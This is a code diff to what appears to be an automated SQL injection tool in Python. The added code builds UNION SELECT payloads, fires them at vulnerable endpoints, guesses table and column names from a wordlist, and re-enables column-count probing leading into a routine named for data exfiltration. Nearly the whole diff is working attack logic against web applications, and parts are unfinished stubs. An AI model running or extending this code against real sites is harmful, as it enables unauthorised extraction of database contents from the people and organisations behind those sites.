@@ -1,3 +1,4 @@
+import json
 import random
 import requests
 import string
@@ -11,13 +12,47 @@ log = Auxiliary(__name__)
 log.set_config()
 
 
+def verify_table_column(url, table, column, options: list):
+    exists = False
+    vuln_endpoints, db_comment, num_cols = options[0], options[1], options[2]
+    columns = ', '.join([column] * num_cols)
+    pld = f"' UNION SELECT {columns} FROM {table}{db_comment}"
+    for endp in vuln_endpoints:
+        r = requests.get(url=url + endp + pld)
+        if r.status_code == 200:
+            log.logger.info(f"{GREEN}[+]{RESET} Column {column} "
+                            f"exists in table {table}, appending it")
+            exists = True
+    return exists
+
+
+def guess_table_column(url, options: list):
+    valid_table_column = [[], []]
+    tables_json = File("tables.json")
+    data = json.load(tables_json.file)
+    # We are traversing tables here
+    for table in data:
+        for column in data[table]:
+            if verify_table_column(url, table, column, options):
+                if table not in valid_table_column[0]:
+                    valid_table_column[0].append(table)
+                valid_table_column[1].append(column)
+                # print(valid_table_column)
+
+            # for index in range(0, num_cols):
+            #     # We add +1 because str_index starts with 0
+            #     if str_index[index] == index + 1:
+            #         pld = verify_column(column, db_comment, num_cols)
+            #         print(pld)
+
+
 def try_data_exfil(url, options: list):
-    vuln_endpoints, db_comment, num_cols, str_index = \
-        options[0], options[1], options[2], options[3]
-    tables = File("tables.txt")
-    columns = File("columns.txt")
-    # for table_line in tables:
-    print(tables.readline())
+    num_cols = options[2]
+    if num_cols == 1:
+        pass
+        # try_concat()
+    else:
+        guess_table_column(url, options)
 
 
 def swap_null_w_str(pld, text_str, index, options: list):
@@ -107,8 +142,8 @@ def try_null_sqli(url, options: list):
 
 
 def try_union_sqli(url, options: list):
-    # options[2] = try_null_sqli(url, options)
-    # if not options[2]:
-    #     options[2] = try_order_by_sqli(url, options)
-    # find_text_cols(url, options)
+    options[2] = try_null_sqli(url, options)
+    if not options[2]:
+        options[2] = try_order_by_sqli(url, options)
+    find_text_cols(url, options)
     try_data_exfil(url, options)
